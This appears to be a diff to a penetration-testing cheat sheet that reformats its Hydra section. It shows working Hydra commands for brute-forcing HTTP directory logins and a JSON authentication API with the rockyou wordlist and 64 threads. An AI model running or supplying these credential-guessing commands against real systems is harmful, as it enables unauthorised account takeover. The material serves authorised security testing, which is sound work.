@@ -16,11 +16,11 @@ Test a login with same user as password, null password and reverse username as p
 
     hydra -l USER -P LIST TARGET_IP http-get /directory/
 
-## JSON brute force with hydra
+## JSON brute force with Hydra
 
 ### Example:
 
-#### hydra -l USER -P rockyou.txt TARGET_IP -s TARGET_PORT http-post-form "/api/session/authenticate{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
+    hydra -l USER -P rockyou.txt TARGET_IP -s TARGET_PORT http-post-form "/api/session/authenticate{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
 
 ### Run Hydra using a proxy against an internal target with the commands:
 
